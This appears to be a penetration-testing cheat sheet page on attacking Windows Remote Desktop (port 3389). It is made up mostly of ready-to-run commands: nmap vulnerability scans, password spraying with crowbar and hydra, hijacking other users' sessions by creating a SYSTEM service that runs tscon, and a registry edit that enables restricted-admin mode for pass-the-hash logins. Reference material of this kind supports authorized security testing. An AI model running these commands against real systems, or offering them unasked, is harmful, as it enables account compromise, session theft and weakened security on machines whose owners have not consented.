# RDP \[3389]

## Enumeration

```
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```

## Brute force

{% hint style="danger" %}
**you could lock accounts if the failed attempts are exceeded.**
{% endhint %}

## **Password Spraying**

<pre><code><strong># crowbar
</strong><strong>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
</strong># hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
</code></pre>

> Password spraying is a form of brute force attack where you use one password and iterate through all user names. The account could still get locked if not careful.

## Session stealing

With **SYSTEM permissions** you can access any **opened RDP session by any user** without need to know the password of the owner.

**Get openned sessions:**

```
query user
```

**Access to the selected session**

```
tscon <ID> /dest:<SESSIONNAME>
```

**Access to the selected session as local administrator priv**

```
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
# create the service which will be ran as SYSTEM priv.
net start sessionhijack
# start the service
```

{% hint style="warning" %}
This no longer works on Server 2019
{% endhint %}

## **Service Interaction**

```shell-session
xfreerdp /v:<target-IP> /u:<user> /p:<pass>
rdesktop <target-IP> -u <user> -p <pass>
```

<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption><p>This error could occur during /pth if DisableRestrictedAdmin is not set</p></figcaption></figure>

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

[CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)
